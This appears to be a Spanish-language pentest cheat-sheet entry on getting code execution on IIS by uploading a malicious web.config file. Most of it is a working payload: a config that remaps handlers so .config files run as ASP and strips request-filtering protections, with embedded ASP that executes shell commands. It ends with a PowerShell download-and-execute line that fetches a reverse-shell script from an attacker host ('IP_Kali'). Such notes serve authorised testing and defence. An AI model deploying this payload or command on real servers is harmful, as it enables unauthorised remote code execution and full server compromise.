# IIS web.config upload

Tags: #IIS

```bash 
Condiciones:
- servidor IIS
- file upload
- acceso al directorio

Idea:
subir web.config para modificar handlers o request filtering

Resultado:
permitir ejecución de código
```

## Si puedes subir el archivo web.config y modificar handlers

```xml 
❯ nano web.config

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config"
           path="*.config"
           verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified"
           requireAccess="Write"
           preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<!-- ASP code comes here!
  <%
  Set co = CreateObject("WScript.Shell")
  Set cte = co.Exec("cmd /c ping IP_Kali")
  output = cte.StdOut.Readall()
  Response.write(output)
  %>
-->
```

```powershell 
# Comando para descargar y ejecutar el script con la revershell 
"cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://IP_Kali/Invoke-PowershellTCP.ps1')"
```